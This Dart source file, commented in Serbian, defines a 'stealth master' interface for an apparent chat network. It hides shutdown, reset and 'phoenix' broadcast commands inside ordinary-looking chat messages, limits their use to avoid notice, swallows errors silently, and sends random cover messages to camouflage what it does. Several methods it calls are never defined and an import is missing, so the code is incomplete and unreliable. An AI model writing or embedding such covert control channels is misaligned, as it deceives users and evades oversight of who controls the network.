import 'dart:convert';
import 'package:crypto/crypto.dart';
import 'secure_master_broadcast.dart';
import '../security/security_types.dart';

class StealthMasterInterface {
  static const String COMMAND_PREFIX = '!'; // Izgleda kao obična poruka
  static const Duration COMMAND_WINDOW = Duration(seconds: 30);
  static const int MAX_DAILY_COMMANDS =
      5; // Limitira upotrebu da ne bi bio uočljiv

  final SecureMasterBroadcast _broadcast;
  final Map<DateTime, int> _commandHistory = {};
  final List<String> _normalUserMessages = [
    'Kako je danas?',
    'Super žurka!',
    'Vidimo se kasnije',
    // Dodaj još običnih poruka za kamuflažu
  ];

  StealthMasterInterface(this._broadcast);

  /// Obrađuje poruku kao običnu chat poruku, ali prepoznaje skrivene komande
  Future<void> handleMessage(String message) async {
    if (!_isMasterCommand(message)) {
      // Izgleda kao obična poruka u chatu
      return;
    }

    if (!_canExecuteCommand()) {
      // Tiho ignoriši - ne pokazuj nikakvu reakciju
      return;
    }

    try {
      final command = _parseCommand(message);
      await _executeStealthCommand(command);

      // Pošalji običnu poruku kao kamuflažu
      await _sendCoverMessage();
    } catch (e) {
      // Nikad ne pokazuj grešku
      await _sendCoverMessage();
    }
  }

  bool _isMasterCommand(String message) {
    if (!message.startsWith(COMMAND_PREFIX)) return false;

    // Dodatne provere da je stvarno Master
    final timestamp = DateTime.now();
    final signature = _extractSignature(message);
    return _verifyMasterSignature(signature, timestamp);
  }

  bool _canExecuteCommand() {
    final now = DateTime.now();
    final today = DateTime(now.year, now.month, now.day);

    // Očisti staru istoriju
    _commandHistory.removeWhere((date, _) => date.difference(today).inDays > 1);

    // Proveri limit
    final dailyCount = _commandHistory[today] ?? 0;
    if (dailyCount >= MAX_DAILY_COMMANDS) return false;

    _commandHistory[today] = dailyCount + 1;
    return true;
  }

  Future<void> _executeStealthCommand(_StealthCommand command) async {
    switch (command.type) {
      case CommandType.phoenix:
        await _broadcast.secureBroadcast(
          message: _encryptCommand(command),
          emergency: true,
        );
        break;

      case CommandType.shutdown:
        // Izvrši gašenje kroz nekoliko običnih operacija
        await _executeWithCover(command);
        break;

      case CommandType.reset:
        // Resetuj mrežu kroz seriju naizgled normalnih akcija
        await _executeWithCover(command);
        break;
    }
  }

  Future<void> _executeWithCover(_StealthCommand command) async {
    // Podeli komandu na više malih, običnih operacija
    final operations = _splitIntoNormalOperations(command);

    // Izvrši ih sa random kašnjenjem da izgledaju normalno
    for (final op in operations) {
      await Future.delayed(Duration(milliseconds: 100 + Random().nextInt(900)));
      await op.execute();
    }
  }

  Future<void> _sendCoverMessage() async {
    final message =
        _normalUserMessages[Random().nextInt(_normalUserMessages.length)];

    // Pošalji kao običan chat
    await _broadcast.secureBroadcast(
      message: message,
      emergency: false,
    );
  }
}

class _StealthCommand {
  final CommandType type;
  final Map<String, dynamic> params;
  final DateTime timestamp;
  final String signature;

  _StealthCommand({
    required this.type,
    required this.params,
    required this.timestamp,
    required this.signature,
  });
}

enum CommandType {
  phoenix,
  shutdown,
  reset,
  // Dodaj ostale komande
}
